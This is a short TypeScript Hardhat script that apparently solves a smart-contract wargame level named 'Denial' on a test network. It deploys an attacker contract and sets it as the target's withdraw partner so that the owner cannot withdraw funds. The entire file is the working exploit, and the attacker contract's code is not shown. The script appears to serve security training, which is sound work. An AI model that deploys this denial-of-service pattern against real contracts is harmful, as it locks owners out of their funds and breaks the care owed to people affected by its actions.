import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Denial"
const CONTRACT_ADDRESS = "0x7f0c9dC7DA381d93580CD0EBbf2dC97A82da5652"
const CONTRACT_NAME_ATTACKER = "DenialAttacker"

async function main() {
    const AlienCodex = await ethers.getContractFactory(CONTRACT_NAME)
    const contract = AlienCodex.attach(CONTRACT_ADDRESS)

    const AlienCodexAttacker = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const contractAttacker = await AlienCodexAttacker.connect(attacker).deploy()
    await contractAttacker.deployed()

    let tx: TransactionResponse = await contract.connect(attacker).setWithdrawPartner(contractAttacker.address)
    await tx.wait()

    console.log("Denial: denied the owner from withdrawing funds when they call withdraw()");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });